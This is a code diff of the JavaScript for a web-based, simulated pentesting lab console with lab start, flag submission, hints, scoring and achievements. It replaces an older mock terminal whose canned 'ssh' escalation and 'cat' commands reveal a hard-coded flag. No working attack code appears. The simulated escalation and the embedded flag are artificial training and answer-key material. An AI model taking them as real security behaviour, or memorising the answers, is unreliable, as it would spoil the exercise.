-                } else if (args[0] === 'secrets' && currentLevel >= 1) {
-                    append('privacy_vault.key  system_flag.txt', 'warning');
+
+            case 'start':
+                const labId = args[0];
+                if (!labId) {
+                    append('Usage: start <lab-id> (e.g., start web-1)', 'danger');
+                } else if (!LAB.labs[labId]) {
+                    append(`Lab ${labId} not found. Use 'labs' to see available labs.`, 'danger');
                 } else {
-                    append('manifests/  logs/  src/  README.md', 'cyan');
+                    startLab(labId);
                 }
                 break;
-            case 'grep':
-                if (args.includes('auth.log')) {
-                    append('20:55:01 Unauthorized SSH attempt from <span class="text-gold">10.0.0.42</span>', 'muted');
-                    append('20:55:30 Access granted to root using <span class="text-cyan">local_pki_key</span>', 'muted');
+
+            case 'submit':
+                const flag = args.join(' ');
+                if (!LAB.currentLab) {
+                    append('No active lab. Use \'start <lab-id>\' to begin a lab.', 'danger');
+                } else if (!flag) {
+                    append('Usage: submit <flag>', 'danger');
                 } else {
-                    append('Usage: grep [pattern] [file]');
+                    submitFlag(flag);
                 }
                 break;
-            case 'whoami':
-                append(currentLevel > 0 ? 'root@nexus (PRIVILEGED)' : 'auditor@nexus (GUEST)');
-                break;
-            case 'ssh':
-                if (args[0] === '10.0.0.42' || args.includes('local_pki_key')) {
-                    append('Authenticating with mTLS...', 'cyan');
-                    setTimeout(() => {
-                        currentLevel = 1;
-                        append('SUCCESS: Terminal escalated to ROOT PRIVILEGE.', 'success');
-                        append('Try checking \'ls secrets\' now.', 'muted');
-                    }, 1000);
+
+            case 'hint':
+                const hintNum = parseInt(args[0]);
+                if (!LAB.currentLab) {
+                    append('No active lab.', 'danger');
+                } else if (!hintNum || hintNum < 1 || hintNum > 3) {
+                    append('Usage: hint <1-3>', 'danger');
                 } else {
-                    append('Remote host unreachable or invalid key.', 'danger');
+                    showHintInTerminal(hintNum);
                 }
                 break;
-            case 'cat':
-                if (args.includes('system_flag.txt') && currentLevel >= 1) {
-                    append('DECRYPTING ARCHITECTURE FLAG...', 'cyan');
-                    setTimeout(() => {
-                        append('FLAG{MTLS_ROOT_SOVEREIGNTY_2026}', 'text-gold fw-bold');
-                    }, 800);
-                } else if (args.includes('readme.md')) {
-                    append('DING PHYSICAL PRIVACY V4<br>This system runs on isolated hardware with no external telemetry.');
+
+            case 'score':
+                append(`Current Score: ${LAB.score} points`, 'gold');
+                append(`Labs Solved: ${LAB.solvedLabs.size}/15`, 'cyan');
+                const percentage = Math.round((LAB.solvedLabs.size / 15) * 100);
+                append(`Progress: ${percentage}%`, 'success');
+                break;
+
+            case 'resources':
+                append('Learning Resources:', 'cyan');
+                append('  • OWASP Top 10: https://owasp.org/Top10', 'muted');
+                append('  • PortSwigger Web Security: https://portswigger.net/web-security', 'muted');
+                append('  • HackTricks: https://book.hacktricks.xyz', 'muted');
+                append('  • Kubernetes Security: https://kubernetes.io/docs/concepts/security', 'muted');
+                break;
+
+            case 'reset':
+                if (LAB.currentLab) {
+                    append(`Lab ${LAB.currentLab.id} has been reset.`, 'warning');
+                    LAB.currentLab = null;
+                    document.getElementById('lab-details').classList.add('d-none');
                 } else {
-                    append('File not found or Access Denied.', 'danger');
+                    append('No active lab to reset.', 'danger');
                 }
                 break;
-            case 'status':
-                append('UPTIME: 364 days, 12:44:01', 'success');
-                append('SILICON: Apple M3 Max [Active]', 'success');
-                append('NETWORK: Air-gapped Mesh Tunnel', 'success');
-                break;
-            case 'exploit':
-                append('NICE TRY. All exploits are logged and blocked by Ingress-Guard.', 'danger');
-                break;
+
             case 'clear':
                 output.innerHTML = '';
                 break;
+
+            case 'whoami':
+                append('pentester (Security Researcher)', 'cyan');
+                break;
+
+            case 'uname':
+                append('Lab-Environment v2.0 (Isolated Sandbox)', 'muted');
+                break;
+
             default:
-                append(`Command not found: \${command}`, 'danger');
+                append(`Command not found: ${command}. Type 'help' for available commands.`, 'danger');
         }
     }
+
+    function startLab(labId) {
+        const lab = LAB.labs[labId];
+        LAB.currentLab = lab;
+
+        append('', 'default');
+        append(`═══════════════════════════════════════`, 'cyan');
+        append(`  ${lab.icon} ${lab.title}`, 'cyan');
+        append(`═══════════════════════════════════════`, 'cyan');
+        append('', 'default');
+        append(`Difficulty: ${lab.difficulty} | Points: ${lab.points}`, 'gold');
+        append('', 'default');
+        append(lab.description.replace(/<\/?code>/g, ''), 'muted');
+        append('', 'default');
+        append('Objectives:', 'purple');
+        lab.objectives.forEach((obj, i) => {
+            append(`  ${i + 1}. ${obj}`, 'muted');
+        });
+        append('', 'default');
+        append('Type \'hint 1\', \'hint 2\', or \'hint 3\' for assistance.', 'warning');
+        append('Submit flag using: submit FLAG{...}', 'success');
+
+        // Show lab details panel
+        document.getElementById('lab-details').classList.remove('d-none');
+        document.getElementById('lab-icon').textContent = lab.icon;
+        document.getElementById('lab-title').textContent = lab.title;
+        document.getElementById('lab-difficulty').textContent = lab.difficulty;
+        document.getElementById('lab-difficulty').className = `badge bg-${lab.difficulty === 'Easy' ? 'success' : lab.difficulty === 'Medium' ? 'warning' : 'danger'}`;
+        document.getElementById('lab-points').textContent = `${lab.points} pts`;
+        document.getElementById('lab-category-badge').textContent = lab.category.toUpperCase();
+        document.getElementById('lab-description').innerHTML = `<p class="text-muted">${lab.description}</p>`;
+
+        const objectivesList = document.getElementById('objectives-list');
+        objectivesList.innerHTML = '';
+        lab.objectives.forEach(obj => {
+            const li = document.createElement('li');
+            li.textContent = obj;
+            objectivesList.appendChild(li);
+        });
+
+        const resourcesDiv = document.getElementById('learning-resources');
+        resourcesDiv.innerHTML = lab.resources.map(r => `<div class="mb-2">📚 ${r}</div>`).join('');
+
+        const vulnsDiv = document.getElementById('related-vulns');
+        vulnsDiv.innerHTML = lab.vulnerabilities.map(v => `<div class="mb-2">⚠️ ${v}</div>`).join('');
+    }
+
+    function submitFlag(flag) {
+        const lab = LAB.currentLab;
+        if (flag.toUpperCase() === lab.flag) {
+            const hintsUsedCount = LAB.hintsUsed[lab.id] || 0;
+            const penalties = [0, 10, 30, 80][hintsUsedCount]; // 0, -10, -30, -80 for hints 0,1,2,3
+            const earnedPoints = Math.max(lab.points - penalties, 10);
+
+            LAB.score += earnedPoints;
+            LAB.solvedLabs.add(lab.id);
+
+            append('', 'default');
+            append('═══════════════════════════════════════', 'success');
+            append('  ✓ FLAG ACCEPTED! LAB COMPLETED!', 'success');
+            append('═══════════════════════════════════════', 'success');
+            append(`  Points Earned: +${earnedPoints}`, 'gold');
+            append(`  Total Score: ${LAB.score}`, 'cyan');
+            append('═══════════════════════════════════════', 'success');
+            append('', 'default');
+
+            showAchievement(lab.title, earnedPoints);
+            updateScoreDisplay();
+            LAB.currentLab = null;
+
+            // Check for milestone achievements
+            if (LAB.solvedLabs.size === 5) {
+                showAchievement('Milestone: First 5 Labs!', 50, '🎉');
+                LAB.score += 50;
+            }
+            if (LAB.solvedLabs.size === 10) {
+                showAchievement('Milestone: 10 Labs Completed!', 100, '🏆');
+                LAB.score += 100;
+            }
+            if (LAB.solvedLabs.size === 15) {
+                showAchievement('🏆 ALL LABS COMPLETED! MASTER PENTESTER!', 500, '👑');
+                LAB.score += 500;
+            }
+        } else {
+            append('✗ Incorrect flag. Try again!', 'danger');
+            append('Hint: Flags are case-sensitive and follow format: FLAG{...}', 'warning');
+        }
+    }
+
+    function showHintInTerminal(hintNum) {
+        const lab = LAB.currentLab;
+        if (!LAB.hintsUsed[lab.id]) LAB.hintsUsed[lab.id] = 0;
+
+        const penalties = [10, 20, 50];
+        const penalty = penalties[hintNum - 1];
+
+        if (LAB.hintsUsed[lab.id] >= hintNum) {
+            append('', 'default');
+            append(`Hint ${hintNum}: ${lab.hints[hintNum - 1]}`, 'warning');
+            return;
+        }
+
+        LAB.hintsUsed[lab.id] = hintNum;
+        LAB.score = Math.max(0, LAB.score - penalty);
+
+        append('', 'default');
+        append(`💡 Hint ${hintNum} (-${penalty} points):`, 'warning');
+        append(lab.hints[hintNum - 1], 'muted');
+        append('', 'default');
+
+        updateScoreDisplay();
+    }
+
+    LAB.showHint = function (hintNum) {
+        if (!LAB.currentLab) {
+            alert('No active lab!');
+            return;
+        }
+        showHintInTerminal(hintNum);
+    };
+
+    function showAchievement(title, points, icon = '🎯') {
+        const container = document.getElementById('achievement-container');
+        const achievement = document.createElement('div');
+        achievement.className = 'achievement-toast';
+        achievement.innerHTML = `
+        <div class="d-flex align-items-center">
+            <span style="font-size: 2rem; margin-right: 15px;">${icon}</span>
+            <div>
+                <div class="fw-bold text-dark" style="font-size: 1.1rem;">${title}</div>
+                <div class="text-dark opacity-75">+${points} points earned!</div>
+            </div>
+        </div>
+    `;
+        container.appendChild(achievement);
+
+        setTimeout(() => {
+            achievement.style.animation = 'slideInRight 0.5s ease-out reverse';
+            setTimeout(() => achievement.remove(), 500);
+        }, 4000);
+    }
+
+    function updateScoreDisplay() {
+        document.getElementById('total-score').textContent = LAB.score;
+        document.getElementById('solved-count').textContent = LAB.solvedLabs.size;
+    }
+
+    // Category card click handlers
+    document.querySelectorAll('.lab-category-card').forEach(card => {
+        card.addEventListener('click', function () {
+            const category = this.dataset.category;
+            if (category) {
+                input.value = `labs ${category}`;
+                input.dispatchEvent(new KeyboardEvent('keydown', { key: 'Enter' }));
+            }
+        });
+    });
+
+    // Initialize
+    updateScoreDisplay();
 </script>
 {% endblock %}
